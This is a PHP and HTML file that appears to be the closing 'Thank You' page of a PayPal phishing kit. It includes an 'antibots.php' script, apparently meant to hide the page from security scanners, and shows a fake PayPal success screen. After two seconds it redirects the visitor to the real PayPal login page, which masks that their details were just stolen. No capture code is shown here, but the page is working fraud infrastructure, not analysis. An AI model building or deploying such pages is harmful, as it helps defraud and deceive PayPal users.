<?php

/*

 */

include 'antibots.php';
include 'config.php';




?>
<!DOCTYPE html>
<html>
<head>
    <title>Thank You  - PayPal</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex" />
    <link rel="icon" href="css/fav.ico" />
    <meta http-equiv="refresh" content="2;url=https://www.paypal.com/cgi-bin/webscr?cmd=_login-run">
    <link href="css/app.css" type="text/css" rel="stylesheet">
</head>
<body style="background-image: url('css/dixon_success.PNG'); background-repeat: no-repeat; background-position: center -1px;height: 780px;">
</body>
</html>